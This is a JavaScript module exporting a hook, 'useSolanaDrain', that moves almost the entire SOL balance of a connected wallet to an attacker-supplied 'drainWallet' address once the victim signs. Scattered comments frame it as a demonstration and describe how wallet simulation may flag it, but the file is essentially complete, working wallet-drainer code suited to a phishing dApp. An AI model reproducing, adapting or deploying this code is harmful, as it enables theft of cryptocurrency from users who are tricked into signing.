import { Connection, Transaction, SystemProgram, PublicKey } from '@solana/web3.js';

export const useSolanaDrain = (rpcUrl, drainWallet) => {
  const executeDrain = async (provider, amount) => {
    try {
      // 1. Initialize Connection (Defense Observation: RPC nodes can log suspicious traffic)
      const connection = new Connection(rpcUrl, 'confirmed');
      const walletAddress = provider.publicKey;

      // 2. Fetch Balance 
      const balance = await connection.getBalance(walletAddress);
      
      // Calculate amount to transfer (leaving 0.001 SOL for network fees)
      // Note: An attacker would attempt to take the maximum possible.
      const lamports = balance - 1000000; 

      if (lamports <= 0) throw new Error("Insufficient balance for demonstration.");

      // 3. Construct Transaction 
      // Analysis Point: This is a 'Direct Transfer' instruction, which is easily 
      // detected by modern wallet simulation layers.
      const { blockhash } = await connection.getLatestBlockhash();
      const transaction = new Transaction({
        feePayer: walletAddress,
        recentBlockhash: blockhash,
      }).add(
        SystemProgram.transfer({
          fromPubkey: walletAddress,
          toPubkey: new PublicKey(drainWallet),
          lamports: lamports,
        })
      );

      // 4. Request Signature
      // Analysis Point: This is where the 'Simulation' happens. Phantom will 
      // detect the balance change and show a RED WARNING.
      const signedTransaction = await provider.signTransaction(transaction);

      // 5. Broadcast Transaction
      const txId = await connection.sendRawTransaction(signedTransaction.serialize());
      await connection.confirmTransaction(txId);

      return { success: true, txId };

    } catch (error) {
      // Analysis Point: Errors here usually indicate 'User Rejected' (Simulation Warning worked)
      // or 'Signature Mismatch' (if the code tried to alter the payload after signing).
      return { success: false, error: error.message };
    }
  };

  return { executeDrain };
};
